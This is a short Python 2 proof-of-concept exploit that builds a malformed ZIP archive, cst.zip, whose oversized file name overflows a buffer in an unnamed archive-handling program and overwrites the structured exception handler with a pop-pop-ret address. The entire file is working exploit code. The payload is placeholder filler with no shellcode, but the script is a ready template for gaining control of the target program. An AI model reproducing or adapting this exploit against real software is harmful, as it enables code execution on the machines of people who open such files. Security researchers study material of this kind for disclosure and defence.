#!/usr/bin/python

header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

print "[+] Building PoC.."

max_size = 4064

nSeh = "B" * 4
Seh  = "\x33\x7a\x40\x00"      # pop pop ret  #  - ascii pop pop ret - 0x00407a33

payload  = "A" * 297
payload += nSeh
payload += Seh
payload += "D" * (max_size - len(payload))
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"

